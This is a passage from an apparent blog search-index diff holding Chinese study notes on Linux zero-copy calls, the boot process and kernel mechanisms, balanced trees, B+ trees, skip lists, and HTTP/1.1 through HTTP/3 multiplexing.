+零拷贝是怎么做的为了优化这类过程，现代操作系统（尤其是 Linux）支持一系列“零拷贝”技术主要思想是消除用户态和内核态之间的数据拷贝，从本质上说，零拷贝的优化目标是：
+
+避免用户态 ↔ 内核态的数据拷贝
+利用 DMA（Direct Memory Access）进行磁盘或网卡直接读写
+重用页缓存或内存映射等机制，减少数据搬运
+
+常见方式有：
+sendfile() 系统调用这是 Linux 最常用的零拷贝接口，专门用来将一个文件“直接发送”到网络套接字。
+sendfile(out_fd, in_fd, NULL, len);
+
+
+内核内部直接将磁盘数据从 Page Cache 映射到 socket 缓冲区
+避免用户态中间缓冲，完全不经过用户空间
+
+实现中仍可能使用 DMA 和 page remapping 等方式来减少复制次数。
+mmap() + write()
+使用 mmap() 将文件直接映射到进程地址空间
+不显式复制数据，直接通过地址映射访问数据
+可用于共享内存或文件映射，也算是一种“用户空间零拷贝”
+
+不过这种方式仍可能涉及写入时的额外 copy，不如 sendfile() 更彻底。
+splice() &#x2F; tee() &#x2F; vmsplice()这是 Linux 提供的更底层的零拷贝接口，用于在文件描述符之间转移数据：
+
+splice()：把数据从一个文件描述符“管道”到另一个，不经用户态
+tee()：复制管道内容，不拷贝数据
+vmsplice()：把用户缓冲区直接插入到管道中
+
+这类接口配合管道&#x2F;套接字使用，可以实现极高性能的数据搬运（比如视频转发服务器）。
+
+系统启动流程与内核机制系统启动的整体流程概览从按下电源按钮开始，到桌面或命令行界面出现，操作系统经历了以下关键阶段：
+
+固件初始化（BIOS 或 UEFI）
+引导加载器（Bootloader）启动
+内核加载与初始化
+用户空间初始化（init 系统）
+系统服务启动，进入用户交互界面
+
+
+固件初始化（BIOS &#x2F; UEFI）当电源接通后，主板上的 BIOS（老式）或 UEFI（现代）固件首先运行。
+
+负责进行 POST（Power-On Self Test），检查内存、CPU、硬盘等是否正常
+枚举设备，构建硬件环境信息
+查找并加载引导设备（硬盘、U 盘等）上的引导加载器程序
+
+UEFI 是 BIOS 的升级版，支持图形界面、GPT 分区、网络引导等高级功能。
+
+引导加载器（Bootloader）引导加载器是磁盘上最先运行的操作系统组件，负责将内核加载到内存中，并交出控制权。
+常见引导程序包括：
+
+GRUB（GRand Unified Bootloader）：最常用的 Linux 启动器
+LILO：早期的引导程序，已逐步被淘汰
+Windows Boot Manager：Windows 系统的启动器
+
+GRUB 的典型工作流程：
+
+加载自身（位于磁盘 MBR 或 EFI 分区）
+显示操作系统菜单（多系统引导）
+加载内核镜像（如 /boot/vmlinuz）到内存
+加载 initrd&#x2F;initramfs 初始内存盘
+跳转到内核入口地址开始执行
+
+
+内核初始化内核接手之后，开始执行一系列底层初始化动作：
+
+检测和初始化 CPU、内存、I&#x2F;O 设备
+建立中断向量表、内核页表、内存管理结构
+启动内核线程，如 kthreadd、ksoftirqd、kworker 等
+挂载根文件系统（从 initramfs 解压或磁盘中挂载 /）
+执行第一个用户态进程：/sbin/init（或 systemd）
+
+这一步之后，内核正式进入“运行态”，并开始管理整个系统。
+
+用户空间初始化（init 进程）init 进程是用户空间的第一个进程，其 PID 恒为 1，是所有用户进程的祖先。
+目前主流的 init 系统有：
+
+System V init：早期采用，使用脚本启动服务，串行启动，效率不高
+Upstart：Ubuntu 曾用，事件驱动模型
+systemd：现代 Linux 系统主流，支持并行启动、服务依赖管理、日志记录（journald）等功能
+
+systemd 会根据配置文件：
+
+启动目标单元（target，如 graphical.target）
+启动后台服务（如 network、dbus、sshd）
+启动登录界面（TTY、GDM、LightDM 等）
+
+最终进入用户交互状态。
+
+用户态与内核态切换操作系统运行在两个权限级别：
+
+用户态（User Mode）：应用程序运行的环境，权限受限
+内核态（Kernel Mode）：内核代码运行环境，权限最高
+
+从用户态进入内核态的三种方式：
+
+系统调用（syscall）：如 read()、fork()，用户显式请求操作系统服务
+中断（interrupt）：如硬件设备完成任务后发出的信号
+异常（exception）：如除以 0、访问非法内存等
+
+内核态执行完毕后，必须安全返回用户态，恢复之前的上下文信息。
+
+系统调用机制系统调用是用户程序访问操作系统核心服务的唯一合法入口。
+流程如下：
+
+用户程序调用 C 库函数（如 open()）
+C 库使用 syscall 指令切入内核态
+内核根据调用号（Syscall Number）执行对应的内核服务
+执行完毕后切回用户态，返回结果
+
+Linux 使用软中断（int 0x80）或 sysenter/syscall 指令进行系统调用，效率较高。
+
+内核模块与热插拔机制内核为提高灵活性，将部分功能设计成可加载模块（.ko 文件），如文件系统、设备驱动等。
+
+使用 insmod 加载模块，rmmod 卸载模块
+使用 modprobe 管理依赖关系
+使用 lsmod 查看当前已加载模块
+
+模块机制支持设备热插拔、内核调试和按需加载。
+
+内核日志与调试Linux 提供多种内核日志和调试工具：
+
+dmesg：查看启动日志和驱动信息
+/proc 文件系统：以文件方式提供内核状态信息（如 /proc/cpuinfo）
+strace：跟踪进程的系统调用
+perf：分析性能瓶颈
+gdb + qemu：进行内核级调试
+
+
+]]></content>
+      <tags>
+        <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构</title>
+    <url>/2025/04/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[快速回忆下大学的数据结构课， 这些看完， 大概下面这些能理解一点啦~
+
+树
+二叉查找树
+完全二叉树
+平衡二叉树
+n叉树
+树的遍历
+B+树
+跳表
+红黑树
+AVL树
+B树
+
+树的基本概念学习树的基础是理解更复杂的树结构（如红黑树、AVL树等）的前提。让我们从最基本的树概念开始。
+树（Tree）是一种非线性的数据结构，由节点（Node）组成，节点之间通过边（Edge）连接。树的结构很像倒立的家谱图或者文件系统的结构。
+树是由根节点（Root）开始，经过多个层级的分支（Branch），直到叶子节点（Leaf）
+树的基本术语：
+根节点（Root）：树的起始节点，没有父节点。
+节点（Node）：树中的每个元素，包含数据部分以及指向其他节点的指针（或引用）。
+边（Edge）：节点之间的连接。
+子节点（Child）：直接连接到某个节点的节点，称为该节点的子节点。
+父节点（Parent）：一个节点的直接连接节点是它的父节点。
+叶子节点（Leaf）：没有子节点的节点。
+高度（Height）：树的高度是从根节点到最深的叶子节点的最长路径的长度（也可以理解为树的层级数）。
+深度（Depth）：节点的深度是从根节点到该节点的路径长度。
+层级（Level）：树中的每一层，通常层级从0开始（根节点是第0层）。
+
+树的类型树可以有不同的形式，以下是几种常见的树类型：
+二叉树 (Binary Tree)
+定义：每个节点最多有两个子节点，通常称为左子节点和右子节点。
+特点：
+每个节点最多有两个子节点。
+二叉树的每个节点可以有不同数量的子节点（0个、1个或2个）。
+
+
+用途：二叉树是很多复杂树结构的基础，例如二叉查找树、堆等。
+
+二叉查找树 (Binary Search Tree, BST)
+定义：它是一种特殊的二叉树，节点的左子树上的所有值都小于节点的值，右子树上的所有值都大于节点的值。
+特点：
+左子树的所有节点的值都小于根节点。
+右子树的所有节点的值都大于根节点。
+这使得搜索操作可以通过比较快速地确定走向左子树还是右子树。
+
+
+用途：用于实现高效的查找、插入、删除等操作。
+
+完全二叉树 (Complete Binary Tree)
+定义：一个二叉树，除了最后一层外，其他层都是满的，并且最后一层的节点都靠左排列。
+特点：
+除了最后一层，其他层的节点数量都是满的。
+最后一层的节点从左到右填充。
+
+
+用途：常用于堆（如大顶堆和小顶堆）等数据结构。
+
+平衡二叉树 (Balanced Binary Tree)
+定义：平衡二叉树是一种二叉树，要求每个节点的左右子树高度差不超过一定的范围（如 AVL 树就是一种平衡二叉树）。
+特点：
+保证树的高度较低，避免树退化成链表。
+高效的查找、插入和删除操作。
+
+
+用途：如 AVL 树、红黑树等，广泛用于数据库索引。
+
+n叉树 (n-ary Tree)
+定义：n叉树是每个节点最多有n个子节点的树。
+特点：
+每个节点最多有n个子节点。
+常用于表示具有多层次的复杂数据结构，如文件系统。
+
+
+
+树的遍历树的遍历是指访问树中所有节点的过程。常见的树的遍历方式有三种：
+前序遍历 (Preorder Traversal)
+步骤：先访问当前节点，然后递归地前序遍历左子树，再递归地前序遍历右子树。
+顺序：根节点 → 左子树 → 右子树。
+
+中序遍历 (Inorder Traversal)
+步骤：递归地中序遍历左子树，访问当前节点，然后递归地中序遍历右子树。
+顺序：左子树 → 根节点 → 右子树。
+特点：二叉查找树的中序遍历结果是按从小到大的顺序排列的。
+
+后序遍历 (Postorder Traversal)
+步骤：递归地后序遍历左子树，再递归地后序遍历右子树，然后访问当前节点。
+顺序：左子树 → 右子树 → 根节点。
+
+层次遍历 (Level Order Traversal)
+步骤：按层级遍历树的节点，通常使用队列来实现。
+顺序：根节点 → 第一层 → 第二层 → 第三层 → ……直到最后一层。
+
+树的应用树作为一种数据结构，有许多实际应用，常见的包括：
+
+文件系统：文件和目录组织成树形结构，根目录是树的根节点，文件和文件夹是节点。
+数据库索引：树结构（如B树、B+树）常用于数据库的索引，帮助快速查找数据。
+游戏决策树：用于表示游戏中的可能决策路径。
+
+
+二叉查找树（Binary Search Tree, BST）定义二叉查找树是一种特殊的二叉树，满足以下性质：
+
+每个节点最多有两个子节点。
+左子树中所有节点的值小于根节点。
+右子树中所有节点的值大于根节点。
+每一棵子树也都是一棵二叉查找树。
+
+操作查找（Search）
+从根节点开始：
+
+如果目标值等于当前节点，返回。
+如果目标值小于当前节点，进入左子树。
+如果目标值大于当前节点，进入右子树。
+
+查找的时间复杂度与树的高度有关，最坏是 O(n)，最优是 O(log n)。
+插入（Insert）
+插入值时，按查找路径向下走，找到空位插入即可，不会破坏 BST 结构。
+删除（Delete）
+分三种情况处理：
+
+删除叶子节点，直接删除。
+删除只有一个子节点的节点，用子节点替换该节点。
+删除有两个子节点的节点，找到该节点的中序后继或中序前驱，用它的值替换当前节点，再删除那个节点。
+
+问题：BST 可能退化成链表如果连续插入有序数据，例如 1、2、3、4、5，树就会变成单边链表，导致查找效率退化为 O(n)。
+为了解决这个问题，就需要引入“自平衡”的机制，也就是平衡二叉树。
+
+平衡二叉树的基本思想什么是平衡树的高度决定了查找、插入、删除的效率。所谓平衡，是指尽量保持每个节点的左右子树高度差不要太大，避免形成单边长链。
+平衡树的目标是让树的高度保持在 O(log n) 以内，从而提高整体性能。
+平衡的实现手段：旋转操作当插入或删除节点后导致失衡，可以通过旋转操作让树重新平衡。
+左旋
+将某个节点的右子节点提升为新的父节点，原父节点变为其左子节点。
+例子： 节点 A 有右子节点 B，B 再有右子节点 C
+原始结构：    A     \      B       \        C左旋后：    B   / \  A   C
+
+右旋
+将某个节点的左子节点提升为新的父节点，原父节点变为其右子节点。
+例子： 节点 C 有左子节点 B，B 再有左子节点 A
+原始结构：    C   /  B /A右旋后：    B   / \  A   C
+
+通过这些旋转，可以动态调整树结构，使其保持平衡。
+
+红黑树简介红黑树是自平衡的二叉查找树，它使用颜色和旋转来控制树的高度。
+红黑树不是严格平衡的，但它能保证最长路径不会超过最短路径的两倍，因此效率稳定。
+红黑树的五个性质
+每个节点是红色或黑色。
+根节点必须是黑色。
+所有叶子节点（NIL 节点）是黑色。
+如果一个节点是红色的，则它的两个子节点必须是黑色的（不能连续两个红色节点）。
+从任意节点到其所有叶子节点的路径上，包含的黑色节点数量必须相同。
+
+这些性质共同保证了树的平衡性。
+
+总结
+普通二叉查找树查找效率依赖于树高，可能退化成链表。
+平衡二叉树通过旋转操作保持结构平衡，提升查找、插入、删除性能。
+红黑树是一种宽松的平衡树，通过颜色约束加旋转来维持近似平衡。
+红黑树是很多底层库和系统（如 Java TreeMap、C++ STL、Linux 内核）使用的高效结构。
+
+
+红黑树与 AVL 性能对比，如何选型这是一个很实用、也很容易被误解的问题。我们来进行一次实事求是的对比，站在工程实践的角度，讲清楚 红黑树 vs AVL 树 的性能差异、适用场景、优缺点、如何选型。
+
+红黑树与 AVL 树的核心差异
+
+
+比较点
+AVL 树
+红黑树
+
+
+
+平衡性
+严格平衡（左右子树高度差 ≤ 1）
+相对平衡（通过颜色规则控制）
+
+
+插入效率
+较慢，可能频繁旋转
+较快，旋转次数更少
+
+
+删除效率
+更慢（容易失衡）
+更快（更容忍不平衡）
+
+
+查找效率
+稍快（更矮更“紧凑”）
+稍慢（更高一些）
+
+
+实现复杂度
+中等
+略高，染色逻辑更麻烦
+
+
+实际树高
+log(n)，更低
+最坏 2log(n)，略高但可接受
+
+
+应用场景
+查找密集
+插入&#x2F;删除频繁
+
+
+
+时间复杂度对比（理论上相同）
+
+
+操作
+AVL
+红黑树
+
+
+
+查找
+O(log n)
+O(log n)
+
+
+插入
+O(log n) + 最多 2 次旋转
+O(log n) + 最多 3 次旋转 + 染色
+
+
+删除
+O(log n) + 最多 log n 次旋转
+O(log n) + 最多 3 次旋转 + 染色
+
+
+注意：红黑树旋转次数少于 AVL，是因为它更“宽松”地控制平衡。
+
+为什么工程中更常用红黑树？1. 插入、删除性能更稳定AVL 树插入删除操作中需要频繁调整结构（旋转），因为它追求高度的平衡性。虽然这保证了查找很快，但维护成本高。
+红黑树采用更“保守”的平衡策略，调整动作较少，整体吞吐量更好。这在系统级开发中非常重要，比如操作系统、数据库、语言运行时。
+2. 插入&#x2F;删除频率高时，红黑树吞吐量优于 AVLAVL树适合“读多写少”的场景，比如缓存系统。
+红黑树适合“读写都频繁”的场景，比如内核调度、任务队列、映射表等。
+
+实际案例对比Java TreeMap &#x2F; TreeSet
+使用的是 红黑树 实现
+原因：Java中集合类通常面对频繁插入和删除（如实时排序、排名等），红黑树性能更均衡
+
+C++ STL 的 std::map &#x2F; std::set
+也使用的是 红黑树
+同样考虑的是泛型容器的插入&#x2F;删除复杂度
+
+Linux 内核调度器 &#x2F; 时间红黑树（RB-tree）
+使用的是红黑树（见 include/linux/rbtree.h）
+因为调度器中的进程插入&#x2F;删除频繁，而查找不一定多，所以使用红黑树性能更佳
+
+
+什么时候选 AVL 树？虽然工程里红黑树更常见，但 AVL 并不是没用，它在以下场景下依然有价值：
+
+对查找性能要求极致，数据变动频率低的场景
+如内存索引、缓存服务、读密集型数据库
+
+
+数据量适中，性能压力可控，希望保证查找时间始终最优
+
+比如：一个静态配置中心，你预先插入一些配置项，然后主要是查找访问。用 AVL 是合理的。
+
+工程选型建议总结
+
+
+场景
+推荐结构
+原因
+
+
+
+查找频繁、插入删除极少
+AVL
+查找快，保持严格平衡
+
+
+插入&#x2F;删除频繁，查找适中
+红黑树
+性能更均衡，旋转少
+
+
+需要范围查询
+B+树
+存储系统常用结构（如数据库）
+
+
+高并发环境下
+并发跳表 &#x2F; 哈希表
+红黑树&#x2F;AVL 不擅长并发控制
+
+
+内核、调度系统
+红黑树
+插入&#x2F;删除频繁，吞吐量更重要
+
+
+学术 &#x2F; 教学用
+AVL
+更容易推导、理解平衡原理
+
+
+
+总结一句话红黑树是工业界的主流选型，因为它在保持平衡和性能之间做了非常合理的权衡。
+而 AVL 更适合做“查找效率最优”的算法研究、教学或低变更场景。
+B树、B+树、跳表非常好，接下来我们进入数据库&#x2F;存储系统中常用的三种结构：B树、B+树、跳表，它们都是用于范围查找、批量排序、动态插入删除等复杂需求下的数据结构。
+我会按这个顺序讲解：
+
+先讲 B 树：基础结构，理解它是后续 B+ 树的前提
+再讲 B+ 树：数据库索引、文件系统最常用结构
+最后讲跳表：高性能内存结构，Redis 的最爱
+
+每一个我们都会涵盖：
+
+是什么（直观理解）
+如何组织数据
+查找&#x2F;插入&#x2F;删除怎么做
+为什么它适合某类场景
+
+
+B 树（Balanced Tree &#x2F; 多路平衡查找树）是什么B 树是一种多路搜索树，是对二叉搜索树的推广。每个节点不仅可以有两个子节点，而是可以有多个。广泛用于磁盘存储、数据库索引结构中，因为它减少了磁盘读写次数。
+特点
+每个节点最多有 m-1 个数据项，m 个子指针（m 是阶数）
+所有节点的关键字保持有序
+插入、删除后依然保持平衡
+所有叶子节点在同一层（树高固定）
+
+举例（以3阶 B 树为例）
+一个节点最多 2 个键，最多有 3 个子节点
+比如节点中有 [10, 20]，它的子树范围：
+子树1：小于 10
+子树2：10~20
+子树3：大于 20
+
+
+
+查找和二分查找类似：
+
+从根节点开始，在节点中查找关键字位置（可以使用二分）
+找不到则沿对应子树向下
+
+时间复杂度为 O(log n)，但每一层“跨度大”，所以树的高度更低，查找更快
+插入
+找到插入位置，插入键
+如果节点已满，就分裂节点，中间值“上提”到父节点
+插入可能从叶子一路调整到根节点，最多增加一层高度
+
+删除
+类似 BST，找到值删掉
+如果节点删除后不满足最小关键字数量，就需要向兄弟借值或合并节点
+复杂度 O(log n)
+
+应用场景
+MySQL 的 MyISAM 引擎使用的是 B 树索引
+适合中等范围查询、单点查找、插入删除都频繁的磁盘结构
+
+
+B+ 树（B Tree 的增强版）是什么B+ 树是 B 树的一个变种，所有值都存在叶子节点，非叶子节点只做“导航”。
+MySQL InnoDB、文件系统、LevelDB 等都使用 B+ 树作为索引结构。
+和 B 树的区别
+
+
+特性
+B 树
+B+ 树
+
+
+
+数据存储
+所有节点存数据
+只有叶子节点存数据
+
+
+内部节点
+数据 + 导航
+仅导航（索引）
+
+
+查找路径
+可提前终止
+一定走到叶子节点
+
+
+范围查询
+差
+强（叶子节点有链表）
+
+
+特点
+所有叶子节点通过链表串起来，方便范围查询
+非叶子节点只做索引，节省空间，扇出更高，树更矮
+结构更适合磁盘块对齐，减少 IO 次数
+
+查找
+和 B 树类似，但一定查到叶子节点才能拿到数据
+路径更统一，便于实现
+
+范围查询
+特别高效，只需要找到范围起点，然后从链表顺着读下去即可
+
+应用场景
+数据库索引（MySQL InnoDB）
+文件系统（如 NTFS, XFS）
+批量范围读取、数据分页、高并发写场景
+
+
+跳表（Skip List）是什么跳表是一种通过在链表上建立多级索引的方式实现快速查找的数据结构。
+你可以理解为：链表 + 多层快速通道，是“概率化”实现的平衡树。
+结构
+底层是有序链表（维护所有元素）
+每一层随机选取一些节点参与“快速通道”
+每一层都是下一层的子集，最顶层最稀疏
+
+比如有 16 个节点，可能层结构像这样：
+Level 3:      A --------- HLevel 2:      A ---- E -- H -- MLevel 1: A - B - C - D - E - F - G - H - I - ... - P
+
+查找
+从顶层开始，逐层往下，直到定位到目标位置
+每次跳跃跨度大，大大加快查找速度
+
+平均时间复杂度：O(log n)
+插入 &#x2F; 删除
+插入新节点后，按概率决定它会出现在多少层（比如 Redis 是1&#x2F;4 概率上升一层）
+删除也是先找到节点，再清理所有层级中的引用
+
+时间复杂度：O(log n)
+应用场景
+Redis 的 zset（有序集合）使用跳表实现
+比树更容易实现，适合内存结构、并发场景
+查找、插入、删除都非常高效
+不需要复杂的旋转、维护，代码比平衡树更简单
+
+
+三者对比总结
+
+
+特性
+B 树
+B+ 树
+跳表
+
+
+
+查找效率
+O(log n)
+O(log n)
+O(log n)
+
+
+插入&#x2F;删除
+O(log n)
+O(log n)
+O(log n)（更简单）
+
+
+是否适合磁盘
+是
+是（最佳）
+否，适合内存
+
+
+是否适合范围查询
+一般
+强（链表）
+强（链表）
+
+
+实现复杂度
+中
+中高
+低（逻辑简单）
+
+
+工程应用
+MyISAM索引
+InnoDB索引，文件系统
+Redis zset、有序内存结构
+
+
+
+总结建议
+数据库磁盘索引：使用 B+ 树。查找、范围查询快，IO次数少，MySQL&#x2F;Oracle&#x2F;SQLite都用它。
+键值对内存结构（Redis）：用跳表。简单好用，查找&#x2F;插入性能稳定。
+老的存储结构或小范围索引：B 树也能用，但现在基本被 B+ 树取代。
+
+
+B树和B+树对比
+B树 和 B+树 都是自平衡的多路查找树，它们通过分支节点和数据节点组织数据，确保了对大规模数据的高效查找。
+B+树 相比于 B树，更加高效，特别是在 范围查询 和 顺序访问 上，因此在数据库和文件系统中，B+树的应用更加广泛。
+B树 适合需要 较少的范围查询 或 较均衡的查找操作 的场景，而 B+树 更适合 大规模数据存储、范围查询和顺序扫描 的场景。
+
+
+什么是 AVL 树？AVL 树 是一种 自平衡的二叉查找树（Binary Search Tree, BST），它的全称是：
+Adelson-Velsky and Landis Tree由两位苏联科学家在 1962 年提出，是世界上第一个自平衡二叉查找树。
+
+AVL 树的核心特性自平衡的定义对于 树中的每一个节点，都必须满足：
+左子树和右子树的高度差 ≤ 1
+这个高度差我们称为该节点的 平衡因子（Balance Factor），它的取值只能是：
+
+-1（右子树比左子树高一层）
+0（左右等高）
++1（左子树比右子树高一层）
+
+一旦插入或删除节点后某个节点的平衡因子超过这个范围（比如变成了 2 或 -2），就需要通过旋转操作来恢复平衡。
+
+为什么需要 AVL 树？普通的二叉查找树（BST）在最坏情况下会退化成链表，导致操作效率变为 O(n)。而 AVL 树通过强制控制“平衡因子”，保持树高度为 O(log n)，确保：
+
+查找（Search）
+插入（Insert）
+删除（Delete）
+
+这些操作都能在对数时间内完成。
+
+AVL 树的旋转操作单旋（Single Rotation）
+右旋（Right Rotation）用于左子树过高（LL 失衡）
+左旋（Left Rotation）用于右子树过高（RR 失衡）
+
+双旋（Double Rotation）
+先左旋再右旋（Left-Right Rotation）用于插入到左子树的右子树（LR 型失衡）
+先右旋再左旋（Right-Left Rotation）用于插入到右子树的左子树（RL 型失衡）
+
+
+操作复杂度
+
+
+操作
+时间复杂度
+
+
+
+查找
+O(log n)
+
+
+插入
+O(log n)（可能旋转）
+
+
+删除
+O(log n)（可能多次旋转）
+
+
+AVL 树高度非常低，接近 log₂(n)，因此查找性能极优。
+
+示例假设我们依次插入以下节点：10 → 20 → 30
+普通 BST 结构变成：
+10  \   20     \      30
+
+此时树高度为 3，已经失衡，AVL 会做一次左旋，变成：
+20   /  \  10  30
+
+保持了平衡。
+
+AVL 树 vs 红黑树
+
+
+对比项
+AVL 树
+红黑树
+
+
+
+平衡程度
+更严格（左右子树高差 ≤ 1）
+较宽松（限制黑节点数目）
+
+
+插入&#x2F;删除效率
+较慢，旋转多
+较快，旋转少
+
+
+查找效率
+稍快
+稍慢
+
+
+实际应用
+内存查找、读多写少
+系统结构、写操作多
+
+
+实现复杂度
+中
+高
+
+
+
+适用场景
+查找频率高，插入&#x2F;删除少的场景，如内存中的索引结构
+不适合频繁更新的场景，因为每次插入&#x2F;删除都可能触发旋转
+
+
+B树与平衡二叉查找树的对比
+
+
+特性
+B树
+平衡二叉查找树（如 AVL 树、红黑树）
+
+
+
+适用场景
+大规模数据存储，尤其是磁盘存储；数据库索引，文件系统管理
+内存中的动态数据存储，集合、映射、优先队列等
+
+
+树的结构
+多路树，每个节点有多个子节点
+二叉树，每个节点最多有两个子节点
+
+
+查找性能
+O(log n)，但通常更适合磁盘存储，减少磁盘访问次数
+O(log n)，在内存中查找非常高效
+
+
+节点大小
+每个节点包含多个键和多个子指针，适合减少磁盘访问次数
+每个节点只包含一个键和最多两个子指针
+
+
+插入&#x2F;删除操作
+节点分裂&#x2F;合并，通常需要更复杂的操作来保持平衡
+旋转操作，通过保持平衡因子来保证平衡
+
+
+支持范围查询
+非常高效，能够快速查找和遍历范围数据
+支持范围查询，但对于大量范围查询不如 B 树高效
+
+
+内存与存储
+适合外存存储，能高效处理大量数据
+适用于内存数据管理，数据规模适中，内存存储
+
+
+]]></content>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络</title>
+    <url>/2025/04/16/%E7%BD%91%E7%BB%9C/</url>
+    <content><![CDATA[概述计算机网络是一组通过通信链路互相连接的计算设备，它们之间可以进行数据传输、信息共享与远程控制。现在使用的手机、电脑和服务器之间的所有数据交换，都依赖计算机网络的支持。
+网络不只是“上网”，而是一整套庞大而复杂的通信机制。为了规范这套机制，人们制定了大量的“网络协议”，这些协议就像交通规则，定义了数据如何发送、接收、确认、重传等等。
+整个网络通信体系可以理解为一个“层级架构”，常见的是“五层网络模型”，它从上到下分为：
+
+应用层：你直接接触的网络服务，比如浏览器、微信、QQ 等。
+传输层：保障数据可靠或高效传输的机制，代表协议有 TCP、UDP。
+网络层：负责选择数据传输路径，代表协议是 IP。
+数据链路层：确保在局域网中一跳一跳地正确传送数据。
+物理层：底层的电缆、网卡、电信号等。
+
+有了这种分层结构，网络系统可以更易于开发、维护和理解。
+应用层应用层位于网络模型的最顶层，直接面向使用者。无论是浏览网页、登录社交平台、收发电子邮件，底层传输的数据最终都要通过应用层协议来组织和解析。应用层不关心数据如何传输，它只关心数据怎么表达、如何理解。
+每种网络应用都有对应的应用层协议，用来规定通信双方“说什么”和“怎么说”。就像人与人之间的交流需要语言规范一样，不同应用之间也需要统一协议来协作。
+
+HTTP 协议的基本结构与特性HTTP 是使用最广泛的应用层协议，主要用于浏览器与服务器之间的数据交互。它的特点是无状态、基于文本、灵活可扩展。
+一个标准的 HTTP 请求包含三个部分：
+
+请求行：例如 GET /index.html HTTP/1.1
+请求头：包含 Host、User-Agent、Accept、Cookie 等字段
+请求体：主要出现在 POST 请求中，用于提交数据
+
+HTTP 协议版本的演进也带来了性能的逐步优化：
+
+HTTP&#x2F;1.1 支持持久连接（Keep-Alive），避免每次请求都重新建立连接
+HTTP&#x2F;2 引入多路复用，多个请求可以复用同一个 TCP 连接，避免阻塞
+HTTP&#x2F;3 改用基于 UDP 的 QUIC 协议，减少连接建立时间并增强安全性
+
+
+HTTPS 与加密通信机制HTTPS 本质上是 HTTP 协议在 TLS 加密通道下的运行方式，主要解决通信过程中的信息泄露和篡改问题。
+使用 HTTPS 时，客户端和服务器会先进行一次 TLS 握手，主要流程包括：
+
+客户端发起连接，带上支持的加密算法
+服务器返回数字证书、公钥等信息
+客户端验证证书合法性，生成对称密钥并加密传输
+双方使用对称密钥进行后续通信
+
+
+HTTP 请求复用HTTP 请求复用是指在同一个网络连接中，多个 HTTP 请求和响应可以被顺序发送和接收，而不需要为每个请求建立新的连接。这个机制是为了提高网络传输的效率，减少延迟和提高资源利用率。
+HTTP 的请求复用在不同版本的协议中有不同的实现方式，主要体现在 HTTP&#x2F;1.x 和 HTTP&#x2F;2 的实现上。
+HTTP&#x2F;1.x 的请求复用（有限）在 HTTP&#x2F;1.0 和 HTTP&#x2F;1.1 中，尽管有一定的复用机制，但也有其局限性：
+HTTP&#x2F;1.0（无持久连接）
+在 HTTP&#x2F;1.0 中，每一个请求都需要独立建立一个新的 TCP 连接，之后该连接关闭。这意味着如果一个页面需要多个资源（如图片、CSS、JavaScript 文件等），每个资源都需要一个独立的连接，这会导致连接建立和关闭的开销非常大。
+
+HTTP&#x2F;1.1（支持持久连接）
+持久连接：HTTP&#x2F;1.1 引入了持久连接（Persistent Connection，Connection: keep-alive），允许多个请求和响应复用同一个 TCP 连接，从而避免了为每个请求建立新连接的开销。
+Keep-Alive：通过 Connection: keep-alive 头部，HTTP&#x2F;1.1 允许在一个连接上发送多个请求和接收多个响应，而无需每次都重新建立连接。
+但是，HTTP&#x2F;1.1 的复用也有限制。即使同一个连接上可以发送多个请求，它仍然是按顺序处理的，每次请求都必须等待前一个请求的响应完成（队头阻塞问题：指的是由于一个数据包或请求的延迟，导致同一连接中的后续数据包或请求也必须等待这个延迟的数据包或请求完成，从而造成整体的延迟增加）。这意味着多个请求不能并行地发送。
+
+
+
+HTTP&#x2F;2 的请求复用（更高效）HTTP&#x2F;2 对请求复用进行了显著的改进，特别是在减少延迟和解决 HTTP&#x2F;1.x 中的“队头阻塞”问题方面。
+多路复用（Multiplexing）
+多路复用是 HTTP&#x2F;2 的核心特性之一。HTTP&#x2F;2 允许多个请求和响应在同一个连接上 并行 发送，而不会互相阻塞。不同的请求和响应通过 流（stream） 来区分，每个流有一个唯一的标识符。这样，多个请求和响应可以同时在同一个连接上发送和接收，而不必等待前一个请求的完成。
+流（Stream）：HTTP&#x2F;2 中的流是一条双向的数据通道，允许请求和响应并行进行。每个流可以独立传输数据，并且流之间是互相独立的，不会因为一个流的延迟而影响其他流的传输。
+头部压缩：HTTP&#x2F;2 使用 HPACK 头部压缩机制，减少了重复的头部信息，从而节省带宽和提高传输效率。
+优先级和流控制：HTTP&#x2F;2 允许客户端和服务器为不同的请求分配优先级，以便合理利用带宽和资源。
+
+
+
+减少延迟
+在 HTTP&#x2F;2 中，客户端可以在同一个连接中同时发送多个请求，不需要等待每个请求的响应。这意味着对于加载多个资源（如图片、CSS、JavaScript 文件等）时，所有的请求可以并行地发送，显著减少了加载时间。
+请求复用 解决了 HTTP&#x2F;1.x 中的队头阻塞问题，即使是同一个连接上的多个请求，它们也能够并行传输，从而大幅提高了性能。
+
+头部压缩
+HTTP&#x2F;2 使用 HPACK 压缩算法来压缩 HTTP 请求和响应的头部信息，减少了传输的数据量，进一步提高了效率。
+
+HTTP&#x2F;3 的请求复用（基于 QUIC）HTTP&#x2F;3 是基于 QUIC 协议的，它进一步改进了请求复用，并解决了网络中断时的恢复问题。
+QUIC 和 HTTP&#x2F;3
+HTTP&#x2F;3 基于 QUIC（Quick UDP Internet Connections）协议，QUIC 是一个基于 UDP 的协议，旨在降低延迟并提高可靠性。QUIC 本身具有多路复用的能力，允许多个请求和响应并行处理。
+由于 QUIC 设计时就考虑到了减少连接建立时间，它比基于 TCP 的 HTTP&#x2F;2 更加高效，尤其是在网络不稳定或需要频繁切换网络的情况下。
+QUIC 通过 0-RTT 连接恢复，减少了建立连接的时间，从而进一步降低了延迟。
+
+请求复用
+在 HTTP&#x2F;3 中，多个请求和响应仍然能够在一个连接中并行地进行，并且不受 TCP 的限制（如队头阻塞）。QUIC 本身在多个数据流上进行多路复用，支持更高效的并发传输。
+
+总结
+HTTP&#x2F;1.1 提供了持久连接的功能，允许在同一个 TCP 连接上复用多个请求，但由于“队头阻塞”问题，它的复用效率有限。
+HTTP&#x2F;2 引入了 多路复用，允许多个请求和响应并行地在同一个连接上进行传输，显著提高了效率并减少了延迟。
+HTTP&#x2F;3 在 HTTP&#x2F;2 的基础上使用了 QUIC 协议，进一步优化了请求复用，特别是在减少连接建立时间和提高传输效率方面。
+
+因此，HTTP&#x2F;2 和 HTTP&#x2F;3 提供了更加高效的请求复用机制，相比于 HTTP&#x2F;1.x，它们在多个资源并行加载和减少延迟方面表现更优。
+
